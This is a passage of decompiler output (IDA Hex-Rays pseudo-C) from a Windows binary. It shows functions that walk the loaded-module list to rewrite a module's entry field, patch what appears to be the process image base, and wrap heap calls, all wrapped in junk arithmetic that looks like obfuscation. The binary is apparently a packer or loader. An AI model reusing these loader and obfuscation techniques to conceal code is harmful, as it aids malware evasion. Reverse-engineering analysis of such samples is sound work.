}
// 401FBF: variable 'v11' is possibly undefined
// 401FC6: variable 'v7' is possibly undefined
// 402070: variable 'v14' is possibly undefined
// 404068: using guessed type int dword_404068;
// 404074: using guessed type int dword_404074;
// 404098: using guessed type int dword_404098;
// 40409C: using guessed type int dword_40409C;
// 4040A0: using guessed type int dword_4040A0;
// 4040A4: using guessed type int dword_4040A4;
// 4040AC: using guessed type int (__stdcall *dword_4040AC)(_DWORD, _DWORD, _DWORD);

//----- (00402580) --------------------------------------------------------
int __cdecl sub_402580(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-20h]
  char v4; // [esp+8h] [ebp-18h]
  _DWORD *v5; // [esp+Ch] [ebp-14h]
  char v6; // [esp+10h] [ebp-10h]
  _DWORD *v7; // [esp+18h] [ebp-8h]

  v3 = *(_DWORD *)(*(_DWORD *)(dword_4040A8 + 48) + 12);
  dword_4040A0 = (710662 >> (61 * v4 - 85)) - dword_4040A0 - dword_404074;
  v5 = *(_DWORD **)(v3 + 12);
  v7 = v5;
  do
  {
    dword_4040A0 = 0;
    if ( !v5 )
      return 0;
    dword_40409C = (987518 * dword_404074) >> (dword_404074 - v6);
    if ( v5[6] == a1 )
    {
      v5[7] = a2;
      return 1;
    }
    dword_40409C *= 3078608;
    v5 = (_DWORD *)*v5;
  }
  while ( v5 != v7 );
  return 0;
}
// 402589: variable 'v4' is possibly undefined
// 4025DD: variable 'v6' is possibly undefined
// 404074: using guessed type int dword_404074;
// 40409C: using guessed type int dword_40409C;
// 4040A0: using guessed type int dword_4040A0;
// 4040A8: using guessed type int dword_4040A8;

//----- (00402670) --------------------------------------------------------
int __cdecl sub_402670(int a1)
{
  int result; // eax

  result = *(_DWORD *)(dword_4040A8 + 48);
  *(_DWORD *)(result + 8) = a1;
  return result;
}
// 404068: using guessed type int dword_404068;
// 40409C: using guessed type int dword_40409C;
// 4040A8: using guessed type int dword_4040A8;
// 4040B0: using guessed type int dword_4040B0;

//----- (004026F0) --------------------------------------------------------
BOOL __cdecl sub_4026F0(LPVOID lpMem)
{
  HANDLE ProcessHeap; // eax

  dword_40409C = -419000454 << dword_404074;
  ProcessHeap = GetProcessHeap();
  return HeapFree(ProcessHeap, 0, lpMem);
}
// 404074: using guessed type int dword_404074;
// 40409C: using guessed type int dword_40409C;

//----- (00402730) --------------------------------------------------------
LPVOID __cdecl sub_402730(SIZE_T dwBytes)
{
  HANDLE ProcessHeap; // eax
  LPVOID result; // eax
  int v3; // [esp+8h] [ebp-10h]
  int v4; // [esp+Ch] [ebp-Ch]
  char v5; // [esp+14h] [ebp-4h]

  dword_4040B0 = v3 >> (50 - v5);
  ProcessHeap = GetProcessHeap();
  result = HeapAlloc(ProcessHeap, 0, dwBytes);
  dword_4040B0 = (dword_4040A0 + v4 + 983917) << v5;
  return result;
}
// 40274A: variable 'v3' is possibly undefined
// 402742: variable 'v5' is possibly undefined
// 40276D: variable 'v4' is possibly undefined
// 4040A0: using guessed type int dword_4040A0;
// 4040B0: using guessed type int dword_4040B0;

// nfuncs=13 queued=12 decompiled=12 lumina nreq=0 worse=0 better=0
// ALL OK, 12 function(s) have been successfully decompiled
